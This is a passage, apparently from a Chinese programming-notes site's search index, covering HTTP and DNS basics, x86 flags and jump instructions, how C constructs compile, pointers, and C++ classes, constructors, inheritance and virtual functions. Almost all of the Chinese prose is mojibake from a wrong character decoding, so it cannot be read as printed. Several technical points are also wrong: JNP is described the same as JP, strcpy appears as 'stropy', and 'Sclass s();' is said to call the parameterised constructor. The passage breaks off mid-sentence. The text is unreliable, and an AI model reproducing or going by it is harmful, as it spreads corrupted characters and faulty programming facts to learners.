è¾“æ§åˆ¶åè®®/äº’è”ç½‘åè®® HTTPï¼šè¶…æ–‡æœ¬ä¼ è¾“åè®® è¿è¡ŒåŸç†\nè¾“å…¥ç½‘å€ æµè§ˆå™¨ä¸ISPé€šä¿¡ï¼Œåœ¨DNSä¸­æŸ¥æ‰¾å¯¹åº”çš„IPåœ°å€ï¼Œç„¶åå‘é€ç»™DNSæœåŠ¡ï¼Œæœ€åå‘IPåœ°å€å‘é€è¯·æ±‚ æµè§ˆå™¨è·å–IPåœ°å€å’Œç«¯å£ï¼Œæ‰“å¼€TCPå¥—æ¥å­—è¿æ¥ï¼Œå®ç°æµè§ˆå™¨å’ŒwebæœåŠ¡å™¨çš„è¿æ¥ å‘é€ç”¨æˆ·HTTPè¯·æ±‚ç»™æœåŠ¡å™¨ webæœåŠ¡å™¨æ ¹æ®è¯·æ±‚æŸ¥æ‰¾ç›¸åº”çš„HTMLé¡µé¢ï¼Œå¹¶è¿”å› æµç¨‹å›¾\ngraph TB A[æµè§ˆå™¨\\nè¾“å…¥ç½‘å€è®¿é—®] B[æ‰¾åˆ°æœåŠ¡å™¨IPåœ°å€] C[æœåŠ¡å™¨] A --é€šè¿‡DNSè§£æåŸŸå--\u003e B B --å‘é€è¯·æ±‚è‡³æœåŠ¡å™¨--\u003e C C --æœåŠ¡å™¨æ¥æ”¶å¤„ç†è¯·æ±‚\\nå¹¶ç›¸åº”è¯·æ±‚--\u003e A DNS\næŠŠåŸŸåæŒ‡å‘ç½‘ç«™ç©ºé—´çš„IPï¼Œè®©äººä»¬é€šè¿‡æ³¨å†Œçš„åŸŸåæ–¹ä¾¿åœ°è®¿é—®åˆ°ç½‘ç«™çš„ä¸€ç§æœåŠ¡ã€‚\ngraph TB A[ç»ˆç«¯è®¾å¤‡] B[DNSæœåŠ¡å™¨] C[ç«™ç‚¹æœåŠ¡å™¨] A --åŸŸåè§£æè¯·æ±‚--\u003e B B --ç«™ç‚¹çš„IPåœ°å€--\u003e A A --ä¾æ®ç«™ç‚¹çš„IPåœ°å€\\nè®¿é—®ç«™ç‚¹--\u003e C "},"title":"Web"},"/docs/windows/windows-bas/":{"data":{"":"","#":"è¿›åˆ¶ æœ¬è´¨ï¼šå…¶å®å°±æ˜¯æŸ¥è¡¨ï¼ŒæŒ‰æ¯ä¸€è¡Œåˆ°ä¸‹ä¸€è¡Œè¿›ä½æ¥æ’åˆ—\né€»è¾‘è¿ç®— æˆ–ï¼ˆor |ï¼‰ï¼šåªè¦æœ‰1ä¸ªå°±æ˜¯1 ä¸ï¼ˆand \u0026ï¼‰ï¼šä¸¤ä¸ªéƒ½ä¸º1æ‰æ˜¯1 å¼‚æˆ–ï¼ˆxor ^ï¼‰:ä¸¤ä¸ªä¸ä¸€æ ·æ‰æ˜¯1 éï¼ˆnot ï¼ï¼‰ï¼š1æ˜¯0ï¼Œ0æ˜¯1 æ±‡ç¼–è¯­è¨€ æ³¨æ„ï¼š\n[]ç­‰ä»·ä¸cè¯­è¨€ä¸­çš„*ï¼ŒleaæŒ‡ä»¤ç›¸å½“äºcè¯­è¨€ä¸­çš„\u0026\næ ‡å¿—å¯„å­˜å™¨å¦‚ä¸‹ï¼š\næ ‡å¿—å¯„å­˜å™¨ è¿›ä½æ ‡å¿—CF(Carry Flag)ï¼šå¦‚æœè¿ç®—ç»“æœçš„æœ€é«˜ä½äº§ç”Ÿäº†ä¸€ä¸ªè¿›ä½æˆ–å€Ÿä½ï¼Œé‚£ä¹ˆï¼Œå…¶å€¼ä¸º1ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚ å¥‡å¶æ ‡å¿—PF(Parity Flag)ï¼šç”¨äºåæ˜ è¿ç®—ç»“æœä¸­â€œ1â€çš„ä¸ªæ•°çš„å¥‡å¶æ€§ã€‚å¦‚æœâ€œ1â€çš„ä¸ªæ•°ä¸ºå¶æ•°ï¼Œåˆ™PFçš„å€¼ä¸º1ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚ï¼ˆæœ‰æ•ˆçš„éƒ¨åˆ†1çš„ä¸ªæ•°ï¼‰ è¾…åŠ©è¿›ä½æ ‡å¿—AF(Auxiliary Carry Flag)ï¼šåœ¨å‘ç”Ÿä¸‹åˆ—æƒ…å†µæ—¶ï¼Œè¾…åŠ©è¿›ä½æ ‡å¿—AFçš„å€¼è¢«ç½®ä¸º1ï¼Œå¦åˆ™å…¶å€¼ä¸º0ï¼š åœ¨å­—æ“ä½œæ—¶ï¼Œå‘ç”Ÿä½å­—èŠ‚å‘é«˜å­—èŠ‚è¿›ä½æˆ–å€Ÿä½æ—¶ï¼› åœ¨å­—èŠ‚æ“ä½œæ—¶ï¼Œå‘ç”Ÿä½4ä½å‘é«˜4ä½è¿›ä½æˆ–å€Ÿä½æ—¶ã€‚ é›¶æ ‡å¿—ZF(Zero Flag)ï¼šé›¶æ ‡å¿—ZFç”¨æ¥åæ˜ è¿ç®—ç»“æœæ˜¯å¦ä¸º0ã€‚å¦‚æœè¿ç®—ç»“æœä¸º0ï¼Œåˆ™å…¶å€¼ä¸º1ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚åœ¨åˆ¤æ–­è¿ç®—ç»“æœæ˜¯å¦ä¸º0æ—¶ï¼Œå¯ä½¿ç”¨æ­¤æ ‡å¿—ä½ã€‚ ç¬¦å·æ ‡å¿—SF(Sign Flag)ï¼šç¬¦å·æ ‡å¿—SFç”¨æ¥åæ˜ è¿ç®—ç»“æœçš„ç¬¦å·ä½ï¼Œå®ƒä¸è¿ç®—ç»“æœçš„æœ€é«˜ä½ç›¸åŒã€‚ æº¢å‡ºæ ‡å¿—OF(Overflow Flag)ï¼šæº¢å‡ºæ ‡å¿—OFç”¨äºåæ˜ æœ‰ç¬¦å·æ•°åŠ å‡è¿ç®—æ‰€å¾—ç»“æœæ˜¯å¦æº¢å‡ºã€‚å¦‚æœè¿ç®—ç»“æœè¶…è¿‡å½“å‰è¿ç®—ä½æ•°æ‰€èƒ½è¡¨ç¤ºçš„èŒƒå›´ï¼Œåˆ™ç§°ä¸ºæº¢å‡ºï¼ŒOFçš„å€¼è¢«ç½®ä¸º1ï¼Œå¦åˆ™ï¼ŒOFçš„å€¼è¢«æ¸…ä¸º0ã€‚ æ³¨æ„ï¼š\næœ€é«˜ä½è¿›ä½ä¸æº¢å‡ºçš„åŒºåˆ«ï¼š\nè¿›ä½æ ‡å¿—è¡¨ç¤ºæ— ç¬¦å·æ•°è¿ç®—ç»“æœæ˜¯å¦è¶…å‡ºèŒƒå›´\næº¢å‡ºæ ‡å¿—è¡¨ç¤ºæœ‰ç¬¦å·æ•°è¿ç®—ç»“æœæ˜¯å¦è¶…å‡ºèŒƒå›´\næº¢å‡ºä¸»è¦æ˜¯ç»™æœ‰ç¬¦å·è¿ç®—ä½¿ç”¨çš„ï¼Œåœ¨æœ‰ç¬¦å·çš„è¿ç®—ä¸­ï¼Œæœ‰å¦‚ä¸‹çš„è§„å¾‹ï¼š\næ­£ + æ­£ = æ­£ å¦‚æœç»“æœæ˜¯è´Ÿæ•°ï¼Œåˆ™è¯´æ˜æœ‰æº¢å‡º\nè´Ÿ + è´Ÿ = è´Ÿ å¦‚æœç»“æœæ˜¯æ­£æ•°ï¼Œåˆ™è¯´æ˜æœ‰æº¢å‡º\næ­£ + è´Ÿ æ°¸è¿œéƒ½ä¸ä¼šæœ‰æº¢å‡º\næœ‰æ— ç¬¦å·ï¼š\næ— ç¬¦å·æ•°ï¼š0 ..... FF æœ‰ç¬¦å·æ•°ï¼š æ­£æ•°ï¼š0 ..... 7F è´Ÿæ•°ï¼š80 ..... FF æ•°æ®æ“ä½œæŒ‡ä»¤ ADCæŒ‡ä»¤ï¼šå¸¦è¿›ä½åŠ æ³•\næ ¼å¼ï¼šADC R/M,R/M/IMM ä¸¤è¾¹ä¸èƒ½åŒæ—¶ä¸ºå†…å­˜ å®½åº¦è¦ä¸€æ ·\nSBBæŒ‡ä»¤ï¼šå¸¦å€Ÿä½å‡æ³•\næ ¼å¼ï¼šSBB R/M,R/M ä¸¤è¾¹ä¸èƒ½åŒæ—¶ä¸ºå†…å­˜ å®½åº¦è¦ä¸€æ ·\nXCHGæŒ‡ä»¤ï¼šäº¤æ¢æ•°æ®\næ ¼å¼ï¼šXCHG R/M,R/M/IMM ä¸¤è¾¹ä¸èƒ½åŒæ—¶ä¸ºå†…å­˜ å®½åº¦è¦ä¸€æ ·\nMOVSæŒ‡ä»¤ï¼šç§»åŠ¨æ•°æ® å†…å­˜-å†…å­˜\nMOVSåé¢è·ŸBï¼ŒWï¼ŒDä»£è¡¨[EDI]å•å…ƒçš„å¤§å°\nSTOSæŒ‡ä»¤ï¼šå°†Al/AX/EAXçš„å€¼å­˜å‚¨åˆ°[EDI]æŒ‡å®šçš„å†…å­˜å•å…ƒ\nSTOSåé¢è·ŸBï¼ŒWï¼ŒDä»£è¡¨[EDI]å•å…ƒçš„å¤§å°\nREPæŒ‡ä»¤ï¼šæŒ‰è®¡æ•°å¯„å­˜å™¨ (ECX) ä¸­æŒ‡å®šçš„æ¬¡æ•°é‡å¤æ‰§è¡Œå­—ç¬¦ä¸²æŒ‡ä»¤\nJCC 1ã€\tJE, JZ ç»“æœä¸ºé›¶åˆ™è·³è½¬(ç›¸ç­‰æ—¶è·³è½¬)\tZF=1 2ã€\tJNE, JNZ ç»“æœä¸ä¸ºé›¶åˆ™è·³è½¬(ä¸ç›¸ç­‰æ—¶è·³è½¬) ZF=0 3ã€\tJS ç»“æœä¸ºè´Ÿåˆ™è·³è½¬\tSF=1 4ã€\tJNS ç»“æœä¸ºéè´Ÿåˆ™è·³è½¬\tSF=0 5ã€\tJP, JPE ç»“æœä¸­1çš„ä¸ªæ•°ä¸ºå¶æ•°åˆ™è·³è½¬\tPF=1 6ã€\tJNP, JPO ç»“æœä¸­1çš„ä¸ªæ•°ä¸ºå¶æ•°åˆ™è·³è½¬\tPF=0 7ã€\tJO ç»“æœæº¢å‡ºäº†åˆ™è·³è½¬\tOF=1 8ã€\tJNO ç»“æœæ²¡æœ‰æº¢å‡ºåˆ™è·³è½¬\tOF=0 9ã€\tJB, JNAE å°äºåˆ™è·³è½¬ (æ— ç¬¦å·æ•°)\tCF=1 10ã€\tJNB, JAE å¤§äºç­‰äºåˆ™è·³è½¬ (æ— ç¬¦å·æ•°)\tCF=0 11ã€\tJBE, JNA å°äºç­‰äºåˆ™è·³è½¬ (æ— ç¬¦å·æ•°)\tCF=1 or ZF=1 12ã€\tJNBE, JA å¤§äºåˆ™è·³è½¬(æ— ç¬¦å·æ•°)\tCF=0 and ZF=0 13ã€\tJL, JNGE å°äºåˆ™è·³è½¬ (æœ‰ç¬¦å·æ•°)\tSFâ‰  OF 14ã€\tJNL, JGE å¤§äºç­‰äºåˆ™è·³è½¬ (æœ‰ç¬¦å·æ•°)\tSF=OF 15ã€\tJLE, JNG å°äºç­‰äºåˆ™è·³è½¬ (æœ‰ç¬¦å·æ•°)\tZF=1 or SFâ‰  OF 16ã€\tJNLE, JG å¤§äºåˆ™è·³è½¬(æœ‰ç¬¦å·æ•°)\tZF=0 and SF=OF C switchè¯­å¥ switchâ€‹è¯­å¥åœ¨caseâ€‹ä¸ºå°äº3ä¸ªæ—¶ï¼Œä¸ä¸‰ä¸ªif elseåˆ¤æ–­é€»è¾‘ç›¸åŒï¼Œå½“å¤§äºä¸‰ä¸ªcaseæ—¶ä¼šç”Ÿæˆä¸€å¼ \"å¤§è¡¨\"ï¼Œâ€œå¤§è¡¨\"ä¼šé€šè¿‡åç§»ï¼ˆå‡å»æœ€å°çš„caseåšåŸºç¡€ï¼‰ç”Ÿæˆåœ°å€è¡¨ï¼Œå†é€šè¿‡æœ€å°å•å…ƒä¹˜åç§»æ‰¾åˆ°è¦è·³è½¬è¡¨çš„åœ°å€è¿›è¡Œè·³è½¬ã€‚ä¸è¿ç»­æ—¶ä¹Ÿä¼šç”Ÿæˆ\"å¤§è¡¨â€ï¼Œé€šè¿‡å°†ä¸å­˜åœ¨çš„caseçš„å¯¹åº”åœ°å€å†™ä¸ºè·³å‡ºåœ°å€ã€‚æ¯”å…¨éƒ¨ä½¿ç”¨if elseæ¥åˆ¤æ–­æ›´å¿«\nforå¾ªç¯ for(A;B;C){D}â€‹çš„æ‰§è¡Œé¡ºåºä¸ºABDC BDC ... æ±‡ç¼–è¯­è¨€çš„ä¹¦å†™é¡ºåºæ˜¯ABDC jmp A\nå¤šç»´æ•°ç»„ åº•å±‚é€»è¾‘å°±æ˜¯è¿ç»­å­˜å‚¨ï¼Œä¸ç›¸åŒæ•°é‡çš„ä¸€ç»´æ•°ç»„ç­‰æ•ˆã€‚åŒºåˆ«ä»…ä»…æ˜¯å¼€å‘äººå‘˜å¥½æ‰¾æ•°ç»„ä¸­çš„å€¼ï¼Œç¼–è¯‘å™¨æ‰¾å€¼æ˜¯å¥—å…¬å¼çš„ï¼Œå‡å¦‚åœ¨æ•°ç»„arr[5][4][3]ä¸­æ‰¾arr[1][2][1]â€‹ï¼Œåˆ™æ˜¯arr[1Ã—4Ã—3+2Ã—3+1]\næŒ‡é’ˆ 1ã€ä¸å¸¦ç±»å‹çš„å˜é‡ï¼Œ ++æˆ–è€…â€“éƒ½æ˜¯åŠ 1 æˆ–è€…å‡1\n2ã€å¸¦ç±»å‹çš„å˜é‡ï¼Œ ++æˆ–è€…â€“æ–°å¢(å‡å°‘)çš„æ•°é‡æ˜¯å»æ‰ä¸€ä¸ª*åå˜é‡çš„å®½åº¦\n3ã€æŒ‡é’ˆç±»å‹çš„å˜é‡å¯ä»¥åŠ ã€å‡ä¸€ä¸ªæ•´æ•°ï¼Œä½†ä¸èƒ½ä¹˜æˆ–è€…é™¤.\n4ã€æŒ‡é’ˆç±»å‹å˜é‡ä¸å…¶ä»–æ•´æ•°ç›¸åŠ æˆ–è€…ç›¸å‡æ—¶ï¼šæŒ‡é’ˆç±»å‹å˜é‡+N =æŒ‡é’ˆç±»å‹å˜é‡+Nï¼ˆå»æ‰ä¸€ä¸ªåç±»å‹çš„å®½åº¦ï¼‰æŒ‡é’ˆç±»å‹å˜é‡-N= æŒ‡é’ˆç±»å‹å˜é‡-Nï¼ˆå»æ‰ä¸€ä¸ªåç±»å‹çš„å®½åº¦ï¼‰\n\u0026å’Œ* \u0026å–åœ°å€ç¬¦ï¼ˆä½†ä¸ä¸€å®šæ˜¯åœ°å€å“¦ï¼‰ï¼Œå°†åŸæ¥çš„å˜é‡ç±»å‹ååŠ *ï¼Œæ¯”å¦‚intå˜int *\n*å–å€¼ç¬¦ï¼ŒåŠ ä¸Šä¸€ä¸ªæŒ‡é’ˆç±»å‹å°±æ˜¯æŒ‡é’ˆç±»å‹å‡å»ä¸€ä¸ª * ï¼ˆä¸\u0026æ˜¯äº’é€†æ“ä½œï¼‰\nç‰¹æ€§ï¼š\nå¸¦æœ‰ * çš„å˜é‡ç±»å‹çš„æ ‡å‡†å†™æ³•ï¼šå˜é‡ç±»å‹ * å˜é‡å\nä»»ä½•ç±»å‹éƒ½å¯ä»¥å¸¦ * ï¼ŒåŠ ä¸Š * ä»¥åæ˜¯æ–°çš„ç±»å‹\nå¯ä»¥æ˜¯ä»»æ„å¤šä¸ª å¸¦ * ç±»å‹çš„å˜é‡èµ‹å€¼æ—¶åªèƒ½ä½¿ç”¨ â€œå®Œæ•´å†™æ³•â€ .\nå¸¦ * ç±»å‹çš„å˜é‡å®½åº¦æ°¸è¿œæ˜¯4å­—èŠ‚ã€æ— è®ºç±»å‹æ˜¯ä»€ä¹ˆï¼Œæ— è®ºæœ‰å‡ ä¸ª * .\nä¸å¸¦ * ç±»å‹çš„å˜é‡ï¼Œ++æˆ–è€…â€“ éƒ½æ˜¯å‡1 æˆ–è€…å‡1 å¸¦ * ç±»å‹çš„å˜é‡ï¼Œå¯æ˜¯è¿›è¡Œ++ æˆ–è€… â€“çš„æ“ä½œ å¸¦* ç±»å‹çš„å˜é‡ï¼Œ++ æˆ–è€… â€“ æ–°å¢(å‡å°‘)çš„æ•°é‡æ˜¯å»æ‰ä¸€ä¸ª * åå˜é‡çš„å®½åº¦\nå¸¦ * ç±»å‹çš„å˜é‡å¯ä»¥åŠ ã€å‡ä¸€ä¸ªæ•´æ•°ï¼Œä½†ä¸èƒ½ä¹˜æˆ–è€…é™¤.\nå¸¦ * ç±»å‹å˜é‡ä¸å…¶ä»–æ•´æ•°ç›¸åŠ æˆ–è€…ç›¸å‡æ—¶ï¼š\nå¸¦ * ç±»å‹å˜é‡ + N = å¸¦ * ç±»å‹å˜é‡ + N * ï¼ˆå»æ‰ä¸€ä¸ª * åç±»å‹çš„å®½åº¦ï¼‰ å¸¦ * ç±»å‹å˜é‡ - N = å¸¦ * ç±»å‹å˜é‡ - N * ï¼ˆå»æ‰ä¸€ä¸ª * åç±»å‹çš„å®½åº¦ï¼‰ ä¸¤ä¸ªç±»å‹ç›¸åŒçš„å¸¦ * ç±»å‹çš„å˜é‡å¯ä»¥è¿›è¡Œå‡æ³•æ“ä½œ.\næƒ³å‡çš„ç»“æœè¦é™¤ä»¥å»æ‰ä¸€ä¸ª * çš„æ•°æ®çš„å®½åº¦.\nå¸¦ * çš„å˜é‡ï¼Œå¦‚æœç±»å‹ç›¸åŒï¼Œå¯ä»¥åšå¤§å°çš„æ¯”è¾ƒã€‚\nå­—ç¬¦ä¸²æ“ä½œ 1.int strlen (char* s)â€‹è¿”å›å€¼æ˜¯å­—ç¬¦ä¸²sçš„é•¿åº¦ã€‚ä¸åŒ…æ‹¬ç»“æŸç¬¦%0ã€‚\n2.char* stropy (char* dest, char* src);â€‹å¤åˆ¶å­—ç¬¦ä¸²srcåˆ°destä¸­ã€‚è¿”å›æŒ‡é’ˆä¸ºdestçš„å€¼ã€‚\n3.char* strcat (char* dest, char* src);â€‹å°†å­—ç¬¦ä¸²srcæ·»åŠ åˆ°destå°¾éƒ¨ã€‚è¿”å›æŒ‡é’ˆä¸ºdestçš„å€¼ã€‚\n4.int strcmp (char* s1, char* s2);â€‹ä¸€æ ·è¿”å›0 ä¸ä¸€æ ·è¿”å›é0\næŒ‡é’ˆå–å€¼æ“ä½œ *(p+i) =p[i]â€‹\n*( *(p+i)+k) = p[i][k]â€‹\n*( *( *(p+i)+k)+m) = p[i][k][m]â€‹\n*( *( *( *( *(p+i)+k)+m)+w)+t) = p[i][k][m][w][t]â€‹\n*()ä¸[]å¯ä»¥ç›¸äº’è½¬æ¢\nC++ //ç±»: struct Student { int a; int b; int c; int d; int Plus()\t//\u003c--------(å°è£…)æˆå‘˜å‡½æ•° { return a+b+c+d; } }; æ¦‚è¿° ä»€ä¹ˆæ˜¯å°è£…ï¼šå°†å‡½æ•°å®šä¹‰åˆ°ç»“æ„ä½“å†…éƒ¨,å°±æ˜¯å°è£…ã€‚ ä»€ä¹ˆæ˜¯ç±»ï¼šå¸¦æœ‰å‡½æ•°çš„ç»“æ„ä½“ï¼Œç§°ä¸ºç±»ã€‚ ä»€ä¹ˆæ˜¯æˆå‘˜å‡½æ•°ï¼šç»“æ„ä½“é‡Œé¢çš„å‡½æ•°ï¼Œç§°ä¸ºæˆå‘˜å‡½æ•°ã€‚ å¦‚æœè¦è°ƒç”¨æˆå‘˜å‡½æ•°æ—¶çš„è§„åˆ™ï¼šç±».å‡½æ•°å(s.Plus())\nthisæŒ‡é’ˆ(ç»“æ„ä½“é¦–åœ°å€) struct Student { int a; int b; int c; int d; int Plus()\t//\u003c-------- { return a+b+c+d; } }; s.Plus()\t//\u003c--------Plus()å‡½æ•°ä¸­é€šè¿‡ecxä¼ å…¥ç»“æ„ä½“é¦–åœ°å€(thisæŒ‡é’ˆ) struct Student { int a; int b; int c; int d; void init(int a,int b,int c,int d)\t//\u003c--------å¯ä»¥é€šè¿‡æˆå‘˜å‡½æ•°å¯¹æˆå‘˜è¿›è¡Œèµ‹å€¼ { this-\u003ea = a; this-\u003eb = b; this-\u003ec = c; this-\u003ed = d; } }; thisæŒ‡é’ˆæ˜¯ç¼–è¯‘å™¨é»˜è®¤ä¼ å…¥çš„ï¼Œé€šå¸¸éƒ½ä¼šä½¿ç”¨ecxè¿›è¡Œå‚æ•°çš„ä¼ é€’ã€‚ æˆå‘˜å‡½æ•°éƒ½æœ‰thisæŒ‡é’ˆï¼Œæ— è®ºæ˜¯å¦ä½¿ç”¨ã€‚ thisæŒ‡é’ˆä¸èƒ½åš++--ç­‰è¿ç®—,ä¸èƒ½é‡æ–°è¢«èµ‹å€¼ã€‚ thisæŒ‡é’ˆä¸å ç”¨ç»“æ„ä½“çš„å®½åº¦ã€‚ æ„é€ å‡½æ•° struct Sclass { int a; int b; int c; int d; Sclass()\t//\u003c--------æ²¡æœ‰è¿”å›å€¼ï¼Œåç§°ä¸ç±»åç§°ç›¸åŒ(æ— å‚æ„é€ å‡½æ•°) { printf(\"æ— å‚æ„é€ å‡½æ•°\\n\"); } Sclass(int a,int b,int c,int d)\t//\u003c--------æ²¡æœ‰è¿”å›å€¼ï¼Œåç§°ä¸ç±»åç§°ç›¸åŒ(æœ‰å‚æ„é€ å‡½æ•°) { this-\u003ea = a;\t//\u003c--------å¯ä»¥è¿›è¡Œåˆå§‹åŒ–æ“ä½œ this-\u003eb = b; this-\u003ec = c; this-\u003ed = d; printf(\"æœ‰å‚æ„é€ å‡½æ•°\\n\"); } int Plus() { return a+b+c+d; } }; Sclass s;\t//\u003c--------è°ƒç”¨æ— å‚æ„é€ å‡½æ•° Sclass s();\t//\u003c--------è°ƒç”¨æœ‰å‚æ„é€ å‡½æ•° ä¸ç±»åŒåä¸”æ²¡æœ‰è¿”å›å€¼ åˆ›å»ºå¯¹è±¡çš„æ—¶å€™æ‰§è¡Œ/ä¸»è¦ç”¨äºåˆå§‹åŒ– å¯ä»¥æœ‰å¤šä¸ªï¼ˆæœ€å¥½æœ‰ä¸€ä¸ªæ— å‚çš„ï¼Œä¸€å®šè¦æœ‰ä¸åŒçš„å‚æ•°ä¸ªæ•°çš„ä¸åŒï¼‰ï¼Œç§°ä¸ºé‡è½½å…¶ä»–å‡½æ•°ä¹Ÿå¯ä»¥é‡è½½ ç¼–è¯‘å™¨ä¸è¦æ±‚å¿…é¡»æä¾› ææ„å‡½æ•° struct Person { int age; int level; Person() { printf(\"æ— å‚æ„é€ å‡½æ•°æ‰§è¡Œäº†...\"); } Person(int age,int level) { printf(\"æœ‰å‚æ„é€ å‡½æ•°æ‰§è¡Œäº†...\"); this-\u003eage = age; this-\u003elevel =level; } ~Person()\t//\u003c--------ææ„å‡½æ•°,å¯¹è±¡ä»€ä¹ˆæ—¶å€™åˆ†é…ç©ºé—´,å°±åœ¨ç›¸åº”çš„ç©ºé—´æ”¶å›æ—¶æ‰§è¡Œ(ç»“æŸæ—¶) { printf(\"ææ„å‡½æ•°æ‰§è¡Œäº†...\"); } void Print() { printf(\"%d-%d\\n\",age,level); } }; åªèƒ½æœ‰ä¸€ä¸ªææ„å‡½æ•°ï¼Œä¸èƒ½é‡è½½ ä¸èƒ½å¸¦ä»»ä½•å‚æ•°(å› ä¸ºæ˜¯ç³»ç»Ÿå¸®æˆ‘ä»¬è°ƒç”¨çš„ï¼Œè‡ªç„¶å°±æ²¡æœ‰å‚æ•°äº†) ä¸èƒ½å¸¦è¿”å›å€¼ ä¸»è¦ç”¨äºæ¸…ç†å·¥ä½œ ç¼–è¯‘å™¨ä¸è¦æ±‚å¿…é¡»æä¾› ç»§æ‰¿ æ ¼å¼ï¼š\nstruct Person { int age; int sex; }; struct Teacher { int age; int sex; int level; int classld; }; struct Teacher:Person //\u003c--------å­ç±»:çˆ¶ç±» { int level; int classld; }; ä»€ä¹ˆæ˜¯ç»§æ‰¿ï¼Ÿç»§æ‰¿å°±æ˜¯æ•°æ®çš„å¤åˆ¶ ä¸ºä»€ä¹ˆè¦ç”¨ç»§æ‰¿ï¼Ÿå‡å°‘é‡å¤ä»£ç çš„ç¼–å†™ Personç§°ä¸ºçˆ¶ç±»æˆ–è€…åŸºç±»ï¼ˆè¦å¤åˆ¶ï¼‰ Teacherç§°ä¸ºå­ç±»æˆ–è€…æ´¾ç”Ÿç±» åŒºåˆ«ï¼š\nä¸å±€é™ä¸çˆ¶ç±»çš„ç»§æ‰¿ï¼š\nstruct X { int a; int b; }; struct Y:X { int c; int d; }; struct Z:Y { int e; int f; }; å¤šé‡ç»§æ‰¿ï¼š\nstruct X { int a; int b; }; struct Y { int c; int d; }; struct Z:X,Y\t//\u003c--------å¦‚æœXåœ¨å‰é¢ï¼Œåˆ™åœ¨å†…å­˜ä¸­Xä¹Ÿåœ¨å‰é¢ { int e; int f; }; æƒé™æ§åˆ¶ publicä¸private\npublicçš„æ„æ€æ˜¯ï¼Œè¿™ä¸ªæˆå‘˜å“ªé‡Œéƒ½å¯ä»¥ç”¨ï¼Œä¸ç”¨æ‹…å¿ƒè¢«ä¿®æ”¹ï¼Œæ‰€ä»¥ï¼Œä¸€æ—¦å‘å¸ƒæˆpublicçš„æˆå‘˜ï¼Œæ˜¯ä¸èƒ½å¤Ÿæ”¹åå­—çš„ã€‚ privateçš„æ„æ€æ˜¯ï¼Œè¿™ä¸ªæˆå‘˜åªç”¨äºå†…éƒ¨ä½¿ç”¨ï¼Œä¸è¦åœ¨å…¶ä»–çš„åœ°æ–¹ä½¿ç”¨ã€‚ struct Test\t{\tprivate:\tint x; public:\tint y; };\tæ€»ç»“ï¼š\nå¯¹å¤–æä¾›çš„å‡½æ•°æˆ–è€…å˜é‡ï¼Œå‘å¸ƒæˆpublicçš„ä¸èƒ½éšæ„æ”¹åŠ¨ã€‚ å¯èƒ½ä¼šå˜åŠ¨çš„å‡½æ•°æˆ–è€…å˜é‡ï¼Œå®šä¹‰æˆprivateçš„ è¿™æ ·ç¼–è¯‘å™¨ä¼šåœ¨ä½¿ç”¨çš„æ—¶å€™åšæ£€æµ‹ã€‚ åªæœ‰ç»“æ„ä½“å†…éƒ¨çš„å‡½æ•°æ‰å¯ä»¥è®¿é—®privateçš„æˆå‘˜ã€‚ public/privateå¯ä»¥ä¿®é¥°å‡½æ•°ä¹Ÿå¯ä»¥ä¿®é¥°å˜é‡ã€‚ æ³¨æ„ï¼\nprivateä¿®é¥°çš„æˆå‘˜ä¸æ™®é€šçš„æˆå‘˜æ²¡æœ‰åŒºåˆ«ï¼Œåªæ˜¯ç¼–è¯‘å™¨ä¼šæ£€æµ‹ã€‚ privateä¿®é¥°çš„æˆå‘˜åªæœ‰è‡ªå·±çš„å…¶ä»–æˆå‘˜æ‰èƒ½è®¿é—®ã€‚ classä¸structçš„åŒºåˆ«ï¼šç¼–è¯‘å™¨é»˜è®¤classä¸­çš„æˆå‘˜ä¸ºprivateè€Œstructä¸­çš„æˆå‘˜ä¸ºpublicã€‚ çˆ¶ç±»ä¸­çš„ç¨‹åºç»§æ‰¿åå˜æˆprivateå±æ€§ï¼Œå¦‚æœè¿˜æƒ³æ˜¯publicå±æ€§åˆ™æ”¹ä¸ºï¼šclass Sub:public Baseã€‚ çˆ¶ç±»ä¸­çš„ç§æœ‰æˆå‘˜æ˜¯ä¼šè¢«ç»§æ‰¿çš„ï¼Œåªæ˜¯ç¼–è¯‘å™¨ä¸å…è®¸ç›´æ¥è¿›è¡Œè®¿é—®ã€‚ å°†å®šä¹‰ä¸å®ç°åˆ†ç¦»ï¼Œä»£ç ä¼šæœ‰æ›´å¥½çš„å¯è¯»æ€§ï¼ˆä¸æ˜¯å¿…é¡»çš„ï¼‰\n//xxx.h å¤´æ–‡ä»¶ä¸­ struct Test { int x; int y; int z; void Init(int x,int y,int z); void Function1(); void Function2(); void Function3(); }; //xxx.cppæ–‡ä»¶ä¸­ void Test::Init(int x,int y,int z) { this-\u003ex = x; this-\u003ey = y; this-\u003ez = z; } void Test::Function1() { printf(\"Function1:%x\\n\",x); } void Test::Function2() { printf(\"Function2:%x\\n\",y); } void Test::Function3() { printf(\"Function3:%x\\n\",z); } æ³¨æ„ï¼š\nxxx.håªæ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥æ˜¯ä»»ä½•çš„åç¼€åï¼Œå¦‚æœä½ æ„¿æ„ï¼Œå¯ä»¥å«xxx.exe #include â€¦çš„ä½œç”¨åªæ˜¯æŠŠé‡Œé¢çš„å†…å®¹å¤åˆ¶è¿‡æ¥ï¼Œä»…æ­¤è€Œå·²ã€‚ xxx.hä¸xxx.cppå¹¶ä¸è¦æ±‚ä¸€å®šåŒåã€‚ è™šå‡½æ•° åœ¨å‡½æ•°å‰é¢åŠ ä¸Švirtualâ€‹\nvirtual double area() { return 0; } å¦‚æœè¿™ä¸ªè™šå‡½æ•°è¿æ–¹æ³•ä½“éƒ½æ²¡æœ‰ï¼Œé‚£ä¹ˆç§°ä¹‹ä¸ºçº¯è™šå‡½æ•°\nvirtual double area() = 0 è™šå‡½æ•°ç›®çš„æ˜¯æä¾›ä¸€ä¸ªç»Ÿä¸€çš„æ¥å£ï¼Œè¢«ç»§æ‰¿çš„å­ç±»é‡è½½ï¼Œä»¥å¤šæ€çš„å½¢å¼è¢«è°ƒç”¨ï¼ˆè®©å­ç±»å®ç°ä¸€ä¸ªæ“ä½œï¼‰ã€‚è™šå‡½æ•°å¯ä»¥è¢«ç›´æ¥ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥è¢«å­ç±»é‡è½½ä»¥åä»¥å¤šæ€çš„å½¢å¼è°ƒç”¨ã€‚è€Œçº¯è™šå‡½æ•°æ˜¯å› 